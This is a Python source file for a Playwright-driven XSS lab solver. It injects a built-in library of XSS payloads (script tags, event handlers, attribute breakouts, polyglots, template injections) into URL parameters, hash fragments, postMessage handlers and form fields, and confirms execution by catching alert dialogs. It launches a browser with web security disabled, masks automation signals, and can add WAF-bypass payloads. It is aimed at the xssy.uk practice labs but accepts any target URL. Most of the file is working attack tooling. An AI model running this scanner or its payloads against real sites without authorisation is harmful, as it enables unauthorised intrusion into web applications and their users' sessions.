#!/usr/bin/env python3
"""
Playwright-powered XSS lab solver.

Differentiated from xss_browser_hunter.py by:
  - React/SPA-aware navigation (waits for hydration, handles pushState routing)
  - Hash fragment (#) injection vector
  - Direct DOM injection via page.evaluate()
  - postMessage injection vector
  - Screenshot on confirmed execution
  - Authenticated lab support (cookie/header injection)
  - Step-by-step lab-solver output

Usage:
  python3 xss_browser_tester.py --target "https://lab.example.com/search?q=FUZZ"
  python3 xss_browser_tester.py --target "https://lab.example.com" --vector hash
  python3 xss_browser_tester.py --target "https://lab.example.com" --cookie "session=abc123"
  python3 xss_browser_tester.py --target "https://lab.example.com" --vector postmessage
  python3 xss_browser_tester.py --target "https://lab.example.com" --eval-inject --selector "#search"
"""

from __future__ import annotations

import argparse
import base64
import json
import sys
import time
from dataclasses import asdict, dataclass, field
from datetime import datetime, timezone
from pathlib import Path
from typing import Optional
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

try:
    import requests
except ImportError:
    requests = None

sys.path.insert(0, str(Path(__file__).parent))

try:
    from playwright.sync_api import (
        BrowserContext,
        Dialog,
        Page,
        sync_playwright,
    )
except ImportError:
    print("[!] Playwright not installed. Run: pip install playwright && playwright install chromium")
    sys.exit(1)

try:
    from xss_bypasses_advanced import get_all_bypass_payloads
    _HAS_BYPASSES = True
except ImportError:
    _HAS_BYPASSES = False

# ---------------------------------------------------------------------------
# Payload library — lab-oriented
# ---------------------------------------------------------------------------

LAB_PAYLOADS: dict[str, list[str]] = {
    "classic": [
        "<script>alert(1)</script>",
        "<script>alert(document.domain)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "<svg/onload=alert(1)>",
    ],
    "attr_break": [
        "\" onmouseover=\"alert(1)\" x=\"",
        "' onmouseover='alert(1)' x='",
        "\" autofocus onfocus=\"alert(1)\"",
        "' autofocus onfocus='alert(1)'",
        "\"><svg onload=alert(1)>",
        "'><svg onload=alert(1)>",
        "\"><img src=x onerror=alert(1)>",
    ],
    "js_context": [
        "';alert(1)//",
        "\";alert(1)//",
        "`${alert(1)}`",
        "\\';alert(1)//",
        "</script><script>alert(1)</script>",
        "';alert(1);'",
    ],
    "href_src": [
        "javascript:alert(1)",
        "javascript:alert(document.domain)",
        "data:text/html,<script>alert(1)</script>",
    ],
    "event_autotrigger": [
        "<details open ontoggle=alert(1)>",
        "<input onfocus=alert(1) autofocus>",
        "<select onfocus=alert(1) autofocus>",
        "<textarea onfocus=alert(1) autofocus>",
        "<body onload=alert(1)>",
        "<marquee onstart=alert(1)>",
    ],
    "dom_sinks": [
        # Useful when target reflects into innerHTML / document.write
        "<img src=x id=a onerror=alert(1)>",
        "<svg><script>alert(1)<\\/script>",
        "};alert(1);//",
        "\\\");alert(1);//",
    ],
    "polyglot": [
        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//",
        "'\"--></style></script><svg onload=alert(1)>",
        "<scr<script>ipt>alert(1)</scr</script>ipt>",
        "<script x> alert(1) </script 1=2",
        "\"><<script>alert(1);//<</script>",
    ],
    "template_literal": [
        "${alert(1)}",
        "#{alert(1)}",
        "{{alert(1)}}",
        "<%=alert(1)%>",
        "{alert(1)}",
    ],
}

WAF_SIGNATURES = [
    "access denied", "blocked", "reference #", "attention required",
    "cloudflare", "incapsula", "sucuri", "mod_security", "request rejected",
    "403 forbidden", "illegal request", "web application firewall",
]

# ---------------------------------------------------------------------------
# Data classes
# ---------------------------------------------------------------------------

@dataclass
class TestResult:
    payload: str
    category: str
    vector: str
    param: str
    executed: bool = False
    reflected: bool = False
    blocked: bool = False
    dialog_message: str = ""
    screenshot_path: str = ""
    error: Optional[str] = None
    test_url: str = ""
    status_code: int = 0
    notes: str = ""


@dataclass
class LabReport:
    target: str
    timestamp: str
    total_tested: int = 0
    successes: list[TestResult] = field(default_factory=list)
    reflected: list[TestResult] = field(default_factory=list)
    blocked: list[TestResult] = field(default_factory=list)
    errors: list[TestResult] = field(default_factory=list)

# ---------------------------------------------------------------------------
# Browser setup
# ---------------------------------------------------------------------------

def launch_browser(p, headless: bool = True):
    """Launch stealth Chromium."""
    browser = p.chromium.launch(
        headless=headless,
        args=[
            "--no-sandbox",
            "--disable-setuid-sandbox",
            "--disable-dev-shm-usage",
            "--disable-gpu",
            "--disable-blink-features=AutomationControlled",
            "--disable-web-security",
            "--disable-features=IsolateOrigins,site-per-process",
            "--allow-running-insecure-content",
        ],
    )
    return browser


def make_context(
    browser,
    cookies: list[dict] | None = None,
    extra_headers: dict | None = None,
) -> BrowserContext:
    context = browser.new_context(
        viewport={"width": 1920, "height": 1080},
        user_agent=(
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            "Chrome/124.0.0.0 Safari/537.36"
        ),
        locale="en-US",
        timezone_id="America/New_York",
        ignore_https_errors=True,
    )
    if extra_headers:
        context.set_extra_http_headers(extra_headers)
    if cookies:
        context.add_cookies(cookies)
    return context


def make_page(context: BrowserContext) -> tuple[Page, list[str]]:
    """Create a page with dialog + console interception."""
    page = context.new_page()
    dialogs: list[str] = []

    def on_dialog(dialog: Dialog):
        dialogs.append(dialog.message)
        dialog.dismiss()

    page.on("dialog", on_dialog)

    # Suppress automation signals; emulate real browser
    page.add_init_script("""
        Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
        Object.defineProperty(navigator, 'plugins', {get: () => [1, 2, 3, 4, 5]});
        Object.defineProperty(navigator, 'languages', {get: () => ['en-US', 'en']});
        window.chrome = {runtime: {}};
    """)

    return page, dialogs

# ---------------------------------------------------------------------------
# SPA / React helpers
# ---------------------------------------------------------------------------

def wait_for_spa(page: Page, timeout_ms: int = 5000) -> None:
    """Wait for React/Vue/Angular SPA to finish hydrating.

    Strategy:
      1. Wait for network idle (no pending XHRs)
      2. Poll until document.readyState is 'complete'
      3. Extra tick for React's async rendering pass
    """
    try:
        page.wait_for_load_state("networkidle", timeout=timeout_ms)
    except Exception:
        pass
    try:
        page.wait_for_function("document.readyState === 'complete'", timeout=timeout_ms)
    except Exception:
        pass
    # React's reconciliation typically finishes within one rAF tick
    try:
        page.evaluate("() => new Promise(r => requestAnimationFrame(r))")
    except Exception:
        pass


def navigate_spa(page: Page, url: str, timeout_ms: int = 15000) -> int:
    """Navigate and wait for SPA hydration. Returns HTTP status code."""
    try:
        resp = page.goto(url, wait_until="domcontentloaded", timeout=timeout_ms)
        wait_for_spa(page)
        return resp.status if resp else 0
    except Exception:
        return 0

# ---------------------------------------------------------------------------
# URL helpers
# ---------------------------------------------------------------------------

def inject_into_url(base_url: str, param: str, value: str) -> str:
    parsed = urlparse(base_url)
    qs = parse_qs(parsed.query, keep_blank_values=True)
    qs[param] = [value]
    new_query = urlencode({k: v[0] for k, v in qs.items()})
    return urlunparse(parsed._replace(query=new_query))


def inject_into_fragment(base_url: str, value: str) -> str:
    parsed = urlparse(base_url)
    return urlunparse(parsed._replace(fragment=value))


def is_waf_block(content: str, status_code: int) -> bool:
    if status_code in (403, 406, 429, 503):
        return True
    lowered = content.lower()
    return any(sig in lowered for sig in WAF_SIGNATURES)


def parse_cookies(cookie_str: str, domain: str) -> list[dict]:
    """Parse 'name=value; name2=value2' cookie string."""
    cookies = []
    for part in cookie_str.split(";"):
        part = part.strip()
        if "=" in part:
            name, _, value = part.partition("=")
            cookies.append({"name": name.strip(), "value": value.strip(), "domain": domain, "path": "/"})
    return cookies

# ---------------------------------------------------------------------------
# Injection vectors
# ---------------------------------------------------------------------------

def test_url_param(
    context: BrowserContext,
    base_url: str,
    param: str,
    payload: str,
    category: str,
    screenshot_dir: Path | None,
    verbose: bool,
) -> TestResult:
    page, dialogs = make_page(context)
    test_url = inject_into_url(base_url, param, payload)
    result = TestResult(payload=payload, category=category, vector="url_param", param=param, test_url=test_url)

    try:
        result.status_code = navigate_spa(page, test_url)
        content = page.content()
        result.blocked = is_waf_block(content, result.status_code)

        if dialogs:
            result.executed = True
            result.dialog_message = dialogs[0]
            if screenshot_dir:
                ts = datetime.now().strftime("%H%M%S")
                path = screenshot_dir / f"xss_{ts}_{category}.png"
                page.screenshot(path=str(path))
                result.screenshot_path = str(path)
        elif payload.lower() in content.lower():
            result.reflected = True

    except Exception as exc:
        result.error = str(exc)[:300]
    finally:
        try:
            page.close()
        except Exception:
            pass

    _print_result(result, verbose)
    return result


def test_hash_fragment(
    context: BrowserContext,
    base_url: str,
    payload: str,
    category: str,
    screenshot_dir: Path | None,
    verbose: bool,
) -> TestResult:
    """Inject payload into URL fragment (#). Useful for DOM-based XSS."""
    page, dialogs = make_page(context)
    test_url = inject_into_fragment(base_url, payload)
    result = TestResult(payload=payload, category=category, vector="hash_fragment", param="#", test_url=test_url)

    try:
        result.status_code = navigate_spa(page, test_url)
        # Also try triggering hash-based routing by setting location.hash
        try:
            page.evaluate(f"location.hash = {json.dumps('#' + payload)}")
            page.wait_for_timeout(600)
        except Exception:
            pass

        if dialogs:
            result.executed = True
            result.dialog_message = dialogs[0]
            if screenshot_dir:
                ts = datetime.now().strftime("%H%M%S")
                path = screenshot_dir / f"xss_{ts}_{category}_hash.png"
                page.screenshot(path=str(path))
                result.screenshot_path = str(path)
        else:
            content = page.content()
            result.blocked = is_waf_block(content, result.status_code)
            if payload.lower() in content.lower():
                result.reflected = True

    except Exception as exc:
        result.error = str(exc)[:300]
    finally:
        try:
            page.close()
        except Exception:
            pass

    _print_result(result, verbose)
    return result


def test_postmessage(
    context: BrowserContext,
    base_url: str,
    payload: str,
    category: str,
    screenshot_dir: Path | None,
    verbose: bool,
) -> TestResult:
    """Send payload via window.postMessage. Useful for SPA message handlers."""
    page, dialogs = make_page(context)
    result = TestResult(payload=payload, category=category, vector="postmessage", param="postMessage", test_url=base_url)

    try:
        result.status_code = navigate_spa(page, base_url)

        # Try common postMessage patterns used in labs
        pm_variants = [
            f"window.postMessage({json.dumps(payload)}, '*')",
            f"window.postMessage({{data:{json.dumps(payload)}}}, '*')",
            f"window.postMessage({{type:'xss',value:{json.dumps(payload)}}}, '*')",
            f"window.postMessage({{message:{json.dumps(payload)}}}, '*')",
        ]
        for script in pm_variants:
            try:
                page.evaluate(script)
                page.wait_for_timeout(500)
                if dialogs:
                    break
            except Exception:
                continue

        if dialogs:
            result.executed = True
            result.dialog_message = dialogs[0]
            result.notes = f"triggered by: {script}"
            if screenshot_dir:
                ts = datetime.now().strftime("%H%M%S")
                path = screenshot_dir / f"xss_{ts}_{category}_pm.png"
                page.screenshot(path=str(path))
                result.screenshot_path = str(path)

    except Exception as exc:
        result.error = str(exc)[:300]
    finally:
        try:
            page.close()
        except Exception:
            pass

    _print_result(result, verbose)
    return result


def test_eval_inject(
    context: BrowserContext,
    base_url: str,
    selector: str,
    payload: str,
    category: str,
    screenshot_dir: Path | None,
    verbose: bool,
) -> TestResult:
    """Navigate to page, find selector, fill with payload via page.evaluate (bypasses React controlled-input)."""
    page, dialogs = make_page(context)
    result = TestResult(payload=payload, category=category, vector="eval_inject", param=selector, test_url=base_url)

    try:
        result.status_code = navigate_spa(page, base_url)

        # Use native input value setter to bypass React synthetic events
        js = f"""
        (function() {{
            const el = document.querySelector({json.dumps(selector)});
            if (!el) return false;
            const nativeInputSetter = Object.getOwnPropertyDescriptor(
                window.HTMLInputElement.prototype, 'value'
            );
            if (nativeInputSetter && nativeInputSetter.set) {{
                nativeInputSetter.set.call(el, {json.dumps(payload)});
            }} else {{
                el.value = {json.dumps(payload)};
            }}
            el.dispatchEvent(new Event('input', {{ bubbles: true }}));
            el.dispatchEvent(new Event('change', {{ bubbles: true }}));
            return true;
        }})()
        """
        found = page.evaluate(js)

        if found:
            # Try submit
            try:
                page.press(selector, "Enter")
                wait_for_spa(page, 4000)
            except Exception:
                # fallback: click first submit button
                for btn_sel in ["button[type='submit']", "input[type='submit']", "button"]:
                    try:
                        btn = page.query_selector(btn_sel)
                        if btn:
                            btn.click()
                            wait_for_spa(page, 4000)
                            break
                    except Exception:
                        continue

        if dialogs:
            result.executed = True
            result.dialog_message = dialogs[0]
            if screenshot_dir:
                ts = datetime.now().strftime("%H%M%S")
                path = screenshot_dir / f"xss_{ts}_{category}_eval.png"
                page.screenshot(path=str(path))
                result.screenshot_path = str(path)
        else:
            content = page.content()
            result.blocked = is_waf_block(content, result.status_code)
            if payload.lower() in content.lower():
                result.reflected = True

        if not found:
            result.notes = f"selector '{selector}' not found on page"

    except Exception as exc:
        result.error = str(exc)[:300]
    finally:
        try:
            page.close()
        except Exception:
            pass

    _print_result(result, verbose)
    return result


def test_form_input(
    context: BrowserContext,
    base_url: str,
    input_info: dict,
    payload: str,
    category: str,
    screenshot_dir: Path | None,
    verbose: bool,
) -> TestResult:
    """Fill visible form input with payload and submit."""
    page, dialogs = make_page(context)
    selector = input_info["selector"]
    param_name = input_info.get("name") or input_info.get("id") or selector
    result = TestResult(payload=payload, category=category, vector="form_input", param=param_name, test_url=base_url)

    try:
        result.status_code = navigate_spa(page, base_url)
        page.wait_for_selector(selector, timeout=5000)
        page.fill(selector, payload)

        submitted = False
        try:
            page.press(selector, "Enter")
            wait_for_spa(page, 4000)
            submitted = True
        except Exception:
            pass

        if not submitted:
            for btn_sel in ["button[type='submit']", "input[type='submit']", "button"]:
                btn = page.query_selector(btn_sel)
                if btn:
                    try:
                        btn.click()
                        wait_for_spa(page, 4000)
                        submitted = True
                        break
                    except Exception:
                        continue

        if dialogs:
            result.executed = True
            result.dialog_message = dialogs[0]
            if screenshot_dir:
                ts = datetime.now().strftime("%H%M%S")
                path = screenshot_dir / f"xss_{ts}_{category}_form.png"
                page.screenshot(path=str(path))
                result.screenshot_path = str(path)
        else:
            content = page.content()
            result.blocked = is_waf_block(content, result.status_code)
            if payload.lower() in content.lower():
                result.reflected = True

    except Exception as exc:
        result.error = str(exc)[:300]
    finally:
        try:
            page.close()
        except Exception:
            pass

    _print_result(result, verbose)
    return result

# ---------------------------------------------------------------------------
# Input discovery
# ---------------------------------------------------------------------------

def discover_inputs(context: BrowserContext, url: str) -> list[dict]:
    """Find all testable input fields on the page."""
    page, _ = make_page(context)
    inputs: list[dict] = []
    try:
        navigate_spa(page, url)
        selectors = [
            "input[type='text']", "input[type='search']", "input[type='email']",
            "input[type='url']", "input[type='tel']", "input:not([type])", "textarea",
        ]
        seen: set[str] = set()
        for sel in selectors:
            for el in page.query_selector_all(sel):
                try:
                    name = el.get_attribute("name") or ""
                    el_id = el.get_attribute("id") or ""
                    tag = el.evaluate("el => el.tagName.toLowerCase()")
                    if name:
                        css = f"{tag}[name='{name}']"
                    elif el_id:
                        css = f"#{el_id}"
                    else:
                        css = sel
                    if css not in seen:
                        seen.add(css)
                        inputs.append({"tag": tag, "name": name, "id": el_id, "selector": css})
                except Exception:
                    continue
    except Exception as exc:
        print(f"[!] Input discovery failed: {exc}")
    finally:
        try:
            page.close()
        except Exception:
            pass
    return inputs

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _print_result(r: TestResult, verbose: bool) -> None:
    if r.executed:
        print(f"  [!!] EXEC  [{r.category}] {r.vector}:{r.param} — {r.payload[:70]}")
        if r.dialog_message:
            print(f"       dialog: {r.dialog_message}")
        if r.screenshot_path:
            print(f"       screenshot: {r.screenshot_path}")
    elif verbose:
        if r.reflected:
            status = "REFL"
        elif r.blocked:
            status = "BLOK"
        elif r.error:
            status = "ERR "
        else:
            status = "miss"
        print(f"  [{status}] [{r.category}] {r.vector}:{r.param} — {r.payload[:60]}")

# ---------------------------------------------------------------------------
# Lab solver orchestrator
# ---------------------------------------------------------------------------

class XSSLabSolver:
    def __init__(
        self,
        target: str,
        vector: str = "url_param",
        categories: list[str] | None = None,
        param: str | None = None,
        selector: str | None = None,
        cookie: str | None = None,
        headers: dict | None = None,
        use_bypass_payloads: bool = False,
        headless: bool = True,
        delay: float = 0.2,
        verbose: bool = False,
        screenshots: bool = True,
    ):
        self.target = target if target.startswith(("http://", "https://")) else f"https://{target}"
        self.vector = vector
        self.categories = categories or list(LAB_PAYLOADS.keys())
        self.param = param
        self.selector = selector or "input[type='search'], input[type='text'], input:not([type])"
        self.cookie = cookie
        self.extra_headers = headers or {}
        self.use_bypass_payloads = use_bypass_payloads
        self.headless = headless
        self.delay = delay
        self.verbose = verbose
        self.screenshots = screenshots

        domain = urlparse(self.target).hostname or "localhost"
        self.parsed_cookies = parse_cookies(cookie, domain) if cookie else None

        # Screenshot dir
        self.screenshot_dir: Path | None = None
        if screenshots:
            self.screenshot_dir = Path.home() / "Shared" / "bounty_recon" / "xss_lab_shots"
            self.screenshot_dir.mkdir(parents=True, exist_ok=True)

    def _get_payloads(self) -> dict[str, list[str]]:
        result: dict[str, list[str]] = {}
        for cat in self.categories:
            if cat in LAB_PAYLOADS:
                result[cat] = LAB_PAYLOADS[cat]
        if self.use_bypass_payloads and _HAS_BYPASSES:
            bypass = get_all_bypass_payloads()
            for cat, payloads in bypass.items():
                if cat not in result:
                    result[cat] = []
                result[cat].extend(payloads)
        return result

    def run(self) -> LabReport:
        ts = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")
        report = LabReport(target=self.target, timestamp=ts)
        all_results: list[TestResult] = []

        payloads_by_cat = self._get_payloads()
        total = sum(len(v) for v in payloads_by_cat.values())

        print(f"\n[*] Target  : {self.target}")
        print(f"[*] Vector  : {self.vector}")
        print(f"[*] Payloads: {total} across {len(payloads_by_cat)} categories")
        if self.parsed_cookies:
            print(f"[*] Cookies : {len(self.parsed_cookies)} cookie(s) set")

        with sync_playwright() as p:
            browser = launch_browser(p, headless=self.headless)
            context = make_context(browser, cookies=self.parsed_cookies, extra_headers=self.extra_headers)

            try:
                # Auto-discover URL params / form inputs if not specified
                if self.vector == "url_param":
                    from urllib.parse import parse_qs as _parse_qs
                    params = list(_parse_qs(urlparse(self.target).query).keys())
                    if self.param:
                        params = [self.param]
                    elif not params:
                        params = ["q"]
                    print(f"[*] URL params: {params}")

                elif self.vector == "form_input":
                    form_inputs = discover_inputs(context, self.target)
                    if not form_inputs:
                        print("[!] No form inputs found — falling back to URL param vector")
                        self.vector = "url_param"
                        params = [self.param or "q"]
                    else:
                        print(f"[*] Form inputs: {[i['selector'] for i in form_inputs]}")

                # Test loop
                for category, payloads in payloads_by_cat.items():
                    print(f"\n[>] {category} ({len(payloads)} payloads)")
                    for payload in payloads:
                        results: list[TestResult] = []

                        if self.vector == "url_param":
                            for p_name in params:
                                r = test_url_param(
                                    context, self.target, p_name, payload, category,
                                    self.screenshot_dir, self.verbose,
                                )
                                results.append(r)

                        elif self.vector == "hash":
                            r = test_hash_fragment(
                                context, self.target, payload, category,
                                self.screenshot_dir, self.verbose,
                            )
                            results.append(r)

                        elif self.vector == "postmessage":
                            r = test_postmessage(
                                context, self.target, payload, category,
                                self.screenshot_dir, self.verbose,
                            )
                            results.append(r)

                        elif self.vector == "eval_inject":
                            r = test_eval_inject(
                                context, self.target, self.selector, payload, category,
                                self.screenshot_dir, self.verbose,
                            )
                            results.append(r)

                        elif self.vector == "form_input":
                            for inp in form_inputs:
                                r = test_form_input(
                                    context, self.target, inp, payload, category,
                                    self.screenshot_dir, self.verbose,
                                )
                                results.append(r)

                        all_results.extend(results)

                        # Stop on first confirmed execution
                        if any(r.executed for r in results):
                            print("\n[!!] XSS confirmed — stopping early.")
                            self._build_report(report, all_results)
                            return report

                        if self.delay:
                            time.sleep(self.delay)

            finally:
                context.close()
                browser.close()

        self._build_report(report, all_results)
        return report

    def _build_report(self, report: LabReport, results: list[TestResult]) -> None:
        report.total_tested = len(results)
        for r in results:
            if r.executed:
                report.successes.append(r)
            elif r.reflected:
                report.reflected.append(r)
            elif r.blocked:
                report.blocked.append(r)
            elif r.error:
                report.errors.append(r)

# ---------------------------------------------------------------------------
# Output
# ---------------------------------------------------------------------------

def print_report(report: LabReport) -> None:
    print("\n" + "=" * 60)
    print("  XSS LAB RESULTS")
    print(f"  Target   : {report.target}")
    print(f"  Timestamp: {report.timestamp}")
    print("=" * 60)
    print(f"  Tested    : {report.total_tested}")
    print(f"  CONFIRMED : {len(report.successes)}")
    print(f"  Reflected : {len(report.reflected)}")
    print(f"  Blocked   : {len(report.blocked)}")
    print(f"  Errors    : {len(report.errors)}")
    print("=" * 60)

    if report.successes:
        print("\n[!!] CONFIRMED XSS:")
        for r in report.successes:
            print(f"  vector  : {r.vector}")
            print(f"  param   : {r.param}")
            print(f"  category: {r.category}")
            print(f"  payload : {r.payload}")
            print(f"  dialog  : {r.dialog_message}")
            if r.screenshot_path:
                print(f"  shot    : {r.screenshot_path}")
            if r.notes:
                print(f"  notes   : {r.notes}")
            print()

    if report.reflected and not report.successes:
        print(f"\n[+] Reflected (not executed) — {len(report.reflected)} results:")
        for r in report.reflected[:8]:
            print(f"  [{r.category}] {r.vector}:{r.param} — {r.payload[:80]}")


def save_report(report: LabReport) -> None:
    data = {
        "target": report.target,
        "timestamp": report.timestamp,
        "total_tested": report.total_tested,
        "summary": {
            "confirmed": len(report.successes),
            "reflected": len(report.reflected),
            "blocked": len(report.blocked),
            "errors": len(report.errors),
        },
        "successes": [asdict(r) for r in report.successes],
        "reflected": [asdict(r) for r in report.reflected],
    }
    out_dir = Path.home() / "Shared" / "bounty_recon" / "xss_lab"
    out_dir.mkdir(parents=True, exist_ok=True)
    out_file = out_dir / f"xss_lab_{report.timestamp}.json"
    out_file.write_text(json.dumps(data, indent=2), encoding="utf-8")
    print(f"[+] Report: {out_file}")

# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

def main() -> int:
    parser = argparse.ArgumentParser(
        description="Playwright XSS lab solver — SPA-aware, multi-vector.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Vectors:
  url_param    — inject into URL query parameter (default)
  hash         — inject into URL fragment (#hash)
  postmessage  — send payload via window.postMessage
  eval_inject  — fill React input via native value setter + dispatchEvent
  form_input   — auto-discover and fill form inputs

Examples:
  python3 xss_browser_tester.py --target "https://lab.example.com/search?q=test"
  python3 xss_browser_tester.py --target "https://lab.example.com" --vector hash
  python3 xss_browser_tester.py --target "https://lab.example.com" --vector eval_inject --selector "#searchInput"
  python3 xss_browser_tester.py --target "https://lab.example.com" --cookie "session=abc123" --categories classic attr_break
  python3 xss_browser_tester.py --target "https://lab.example.com" --vector postmessage --bypass-payloads
  python3 xss_browser_tester.py --target "https://lab.example.com" --no-headless --verbose
        """,
    )
    parser.add_argument("--target", help="Target URL")
    parser.add_argument("--lab", type=int, help="xssy.uk lab ID (will fetch token automatically)")
    parser.add_argument("--list-labs", action="store_true", help="List available xssy.uk labs")
    parser.add_argument(
        "--vector",
        choices=["url_param", "hash", "postmessage", "eval_inject", "form_input"],
        default="url_param",
        help="Injection vector (default: url_param)",
    )
    parser.add_argument("--param", help="URL parameter name to inject into (url_param vector)")
    parser.add_argument("--selector", help="CSS selector for eval_inject vector")
    parser.add_argument(
        "--categories",
        nargs="+",
        choices=list(LAB_PAYLOADS.keys()),
        default=None,
        help=f"Payload categories (default: all). Choices: {', '.join(LAB_PAYLOADS.keys())}",
    )
    parser.add_argument("--cookie", help="Cookie string: 'session=abc; csrf=xyz'")
    parser.add_argument("--header", action="append", metavar="NAME:VALUE", help="Extra request header (repeatable)")
    parser.add_argument("--bypass-payloads", action="store_true", help="Include advanced WAF bypass payloads")
    parser.add_argument("--no-headless", action="store_true", help="Run with visible browser (useful for debugging)")
    parser.add_argument("--delay", type=float, default=0.2, help="Delay between tests in seconds (default: 0.2)")
    parser.add_argument("--verbose", "-v", action="store_true", help="Show all results, not just confirmed XSS")
    parser.add_argument("--no-screenshots", action="store_true", help="Disable screenshots on success")

    args = parser.parse_args()

    # Handle xssy.uk lab ID
    target_url = args.target
    if args.list_labs:
        if not requests:
            print("[!] requests library needed. Run: pip install requests")
            return 1
        import requests as req
        resp = req.get("https://xssy.uk/api/allLabs?type=1", timeout=10)
        labs = resp.json()
        print(f"\nAvailable labs ({len(labs)} total):\n")
        for lab in labs[:20]:
            print(f"  Lab {lab['id']}: {lab.get('name', 'N/A')} ({lab.get('rating', {}).get('name', 'N/A')})")
        print("\n  ... (showing first 20)")
        return 0
    
    if args.lab:
        if not requests:
            print("[!] requests library needed. Run: pip install requests")
            return 1
        import requests as req
        resp = req.get(f"https://xssy.uk/api/allLabs/{args.lab}", timeout=10)
        lab_data = resp.json()
        token = lab_data.get("token", "")
        if not token:
            print(f"[!] Lab {args.lab} not found or has no token")
            return 1
        target_url = f"https://{token}.xssy.uk/"
        print(f"[*] Lab {args.lab}: {lab_data.get('name', 'N/A')}")
        print(f"[*] Target: {target_url}")
        objective = lab_data.get("objective", {})
        if isinstance(objective, dict):
            print(f"[*] Objective: {objective.get('name', 'N/A')}")
    
    if not target_url:
        print("[!] Either --target or --lab required")
        return 1
    
    extra_headers: dict[str, str] = {}
    if args.header:
        for h in args.header:
            if ":" in h:
                name, _, value = h.partition(":")
                extra_headers[name.strip()] = value.strip()

    solver = XSSLabSolver(
        target=target_url,
        vector=args.vector,
        categories=args.categories,
        param=args.param,
        selector=args.selector,
        cookie=args.cookie,
        headers=extra_headers,
        use_bypass_payloads=args.bypass_payloads,
        headless=not args.no_headless,
        delay=args.delay,
        verbose=args.verbose,
        screenshots=not args.no_screenshots,
    )

    try:
        report = solver.run()
    except KeyboardInterrupt:
        print("\n[!] Interrupted.")
        return 130

    print_report(report)
    save_report(report)

    return 0 if report.successes else 1


if __name__ == "__main__":
    sys.exit(main())
